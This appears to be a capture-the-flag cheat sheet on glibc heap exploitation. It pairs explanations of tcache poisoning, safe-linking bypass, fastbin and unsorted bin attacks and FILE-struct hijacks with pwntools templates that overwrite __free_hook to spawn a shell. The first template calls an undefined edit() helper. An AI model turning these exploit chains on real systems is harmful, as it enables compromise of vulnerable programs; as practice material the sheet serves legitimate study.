# Heap Pwn

## glibc version differences (must read)

All techniques for heap utilization are strongly bound to the glibc version. Confirm the version first:

```bash
./libc.so.6 | head -1
# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.

# or strings
strings ./libc.so.6 | grep "GNU C Library"
```

| glibc version | Key changes | Impact |
|-----------|---------|------|
| 2.26 and before | has no tcache | unsorted/fastbin is the main battlefield |
| 2.27 | **Introduction of tcache** | tcache poisoning is extremely simple |
| 2.29 | unsorted bin unlink reinforcement (chunk size check) | unsorted bin attack hacked |
| 2.31 | tcache multiple checks (key field) | tcache poisoning slightly complicated |
| 2.32 | **safe-linking** (fd pointer XOR PROTECT_PTR) | needs to leak heap base | first
| 2.34 | **Remove __free_hook / __malloc_hook** | Change to FILE struct / exit handlers |
| 2.35+ | further strengthens | Same as 2.34, FILE path is still available |

## tcache poisoning (2.27 - 2.31)

### principle

tcache is a per-thread cache, each size class has a linked list, singly linked list (only fd).
The double free check before 2.29 only looked at whether the head of the linked list was itself, and did not look at the traversal.

### Leveraging templates (2.27 - 2.31)

```python
from pwn import *

p = process('./vuln')
libc = ELF('./libc.so.6')

def add(idx, size, data=b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

# === Step 1: leak libc base ===
# Apply for a chunk larger than the tcache range (>0x408), free into the unsorted bin, and the main_arena pointer remains
for i in range(8):
    add(i, 0x80)
add(8, 0x80)  # prevent merge
for i in range(7):
    free(i)
free(7)       # The 8th one goes into unsorted bin, fd/bk points to main_arena+96
add(9, 0x80)  # Cut back part and keep fd
leak = u64(show(9).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0  # main_arena+96 offset, glibc 2.27 amd64
log.success(f'libc = {hex(libc.address)}')

# === Step 2: tcache poisoning → write __free_hook ===
add(10, 0x30)
add(11, 0x30)
free(10)
free(11)
# Use UAF to change the fd of chunk11 to point to __free_hook
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # Take out chunk11
add(13, 0x30, p64(libc.sym['system']))  # What is taken out is the __free_hook address, write system

# Trigger: free a chunk with the content "/bin/sh\x00"
add(14, 0x30, b'/bin/sh\x00')
free(14)

p.interactive()
```

## safe-linking bypass (2.32+)

```text
Principle: tcache/fastbin's fd is XORed by PROTECT_PTR when writing:
    PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr

Bypass:
1. A heap address (heap base) must be leaked first
2. Calculate obfuscated value: fake_fd_obf = (chunk_addr >> 12) ^ target
3. Write it in
```

```python
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

# leak heap base (unsorted bin residue / tcache fd residue)
heap_base = leaked_heap & ~0xfff

# poisoning
fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
edit(chunk_id, p64(fake_fd))
```

## fastbin attack (traditional, mainly 2.26 and before)

```text
Key points:
1. fastbin singly linked list (only fd), no size check except chunk size must match
2. After 2.27, tcache takes priority, and fastbin is only used when tcache is full.
3. Still need to fake a memory that looks like chunk (size field = real chunk size, ± some)
```

```python
# double free
add(0, 0x60)
add(1, 0x60)
free(0)
free(1)
free(0)  # fastbin: 0 → 1 → 0

# Change fd to fake chunk (requires size byte at fake_addr + 8 to match 0x70)
add(2, 0x60, p64(fake_addr))
add(3, 0x60)
add(4, 0x60)  # Take out the chunk at fake_addr
```

## unsorted bin attack (2.28 and earlier only)

```text
Principle: Write any address as main_arena+88
The check of bck->fd == victim has been added since 2.29, which cannot be bypassed.
Purpose: Override global_max_fast to allow small chunks to also use fastbin → cooperate with fastbin attack
```

```python
# Apply for unsorted size chunk
add(0, 0x100)
add(1, 0x100)  # Prevent top consolidation
free(0)
# UAF changes the bk pointer to target - 0x10
edit(0, p64(0) + p64(target - 0x10))
add(2, 0x100)  # Take out from unsorted → unlink → main_arena+88 and write to target
```

## large bin attack

```text
Principle: large bin has one more layer than unsorted fd_nextsize / bk_nextsize
Chunk size check has also been added since 2.32, but it can still be used to change global_max_fast, _IO_list_all, etc.
Advanced techniques, often used in combination punches such as House of Husk
```

## House of XXX Quick Check

| Name | Applicable version | Core idea |
|------|---------|---------|
| House of Force | 2.28 and before | Change top chunk size to huge value → malloc any address |
| House of Lore | full version | fake small bin chain → return to any address |
| House of Orange | 2.23-2.30 | unsorted attack change _IO_list_all trigger _IO_flush_all_lockp |
| House of Roman | 2.23-2.26 | 12-bit blast + fastbin attack to __malloc_hook |
| House of Einherjar | full version | fake prev_size + PREV_INUSE=0 → backward consolidation |
| House of Botcake | 2.27+ | tcache + unsorted bin combination, bypassing tcache double free check |
| House of Husk | 2.27+ | Change printf’s hook table (__printf_function_table) |
| House of Cat | 2.34+ | _IO_wfile_seekoff vtable exploit, for the hook-less version |
| House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |

## Real exploit steps (general 4 steps)

```text
Step 1: leak heap base
- Apply for chunk → free to tcache (2.32+ retains obfuscated fd) → show → reverse heap
- Or: apply for large chunk → free to unsorted → switch back → show fd

Step 2: leak libc base
- Large chunk free to unsorted bin, fd/bk remaining main_arena address
  - show → leak → libc.address = leak - main_arena_offset

Step 3: Control IP
- 2.27-2.33: tcache/fastbin poisoning → write __free_hook or __malloc_hook
- 2.34+: FILE struct attack (_IO_2_1_stdout_ / stderr), change vtable → _IO_wfile_jumps
- or: hijack exit handlers (__exit_funcs/tls_dtor_list)

Step 4: getshell
  - free_hook = system, free("/bin/sh") → shell
  - 2.34+: setcontext + 53 gadget → rop chain in heap → execve
```

## libc 2.34+ does not have an alternative path after hook

### FILE struct attack (_IO_2_1_stdout_ / _IO_2_1_stderr_)

```text
Goal: When the program calls puts/printf, it eventually goes to _IO_file_xsputn → _IO_OVERFLOW → calls vtable
hijack:
1. Overwrite the vtable pointer of _IO_2_1_stderr_ to point to the fake vtable
2. Forge vtable and let __overflow field point to system or setcontext
3. Let the first 8 bytes of fp (FILE*) itself be "/bin/sh\x00" (as the rdi of system)
Trigger: any puts/printf/abort/exit will flush stderr
```

### Exit handlers (`__exit_funcs` / `tls_dtor_list`)

```text
Principle: __run_exit_handlers traverses the __exit_funcs linked list and calls each dtor
Hijack: Change the func pointer of the linked list node to point to system, and arg to point to "/bin/sh"
Note: 2.34+ adds PTR_DEMANGLE, which requires the fs:[0x30] guard value in leak tls to forge.
```

### tls_dtor_list (more modern)

```text
__call_tls_dtors traversal, similar structure, also needs to bypass PTR_DEMANGLE
Applicable: Will exit when the program exits, more versatile than FILE attack
```

## pwndbg/GEF heap debugging command

```text
# pwndbg
heap # Display all chunks in the current arena
bins # show tcache / fastbin / unsorted / small / large bins
tcache # Look at tcache alone
find_fake_fast <addr> <size> # Find an fd write point that can be used as fake chunk
vis_heap_chunks # Visual heap layout

# GEF
heap chunks
heap bins fast
heap bins tcache
heap chunk <addr>
```

## Typical pwntools template (heap menu question)

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process('./vuln') if not args.REMOTE else remote('host', 1337)

# IO packaging
def menu(choice):
    p.sendlineafter(b'choice:', str(choice).encode())

def add(idx, size, data=b'\n'):
    menu(1)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data != b'\n':
        p.sendafter(b'data:', data)

def free(idx):
    menu(2)
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    menu(3)
    p.sendlineafter(b'idx:', str(idx).encode())
    return p.recvline().strip()

def edit(idx, data):
    menu(4)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# === Subsequently, select the technology stack based on the vulnerability type ===
```

## Things to note

- **The glibc version is the primary issue** — The same binary configuration 2.27 libc and 2.34 libc have completely different utilization paths
- **tcache capacity = 7** (per size class) - 7 injections are required before overflowing to unsorted/fastbin
- **chunk size = user request + 0x10 header, aligned to 0x10** (not counting the 0x10 header, the actual writeability exceeds 0x8 because the prev_size of the next chunk is reused)
- **Remote heap spraying is unstable** — The brk/mmap of the server-side fork model may be different each time it is connected, and randomization testing is required.
- **Do not leave unsorted residue in the attack chain** — The main_arena pointer appearing in an unexpected chunk will cause confusion in subsequent show output
- **safe-linking error rate** — When calculating PROTECT_PTR, remember that it is `pos >> 12`, pos is the address to be written, not the address to point to
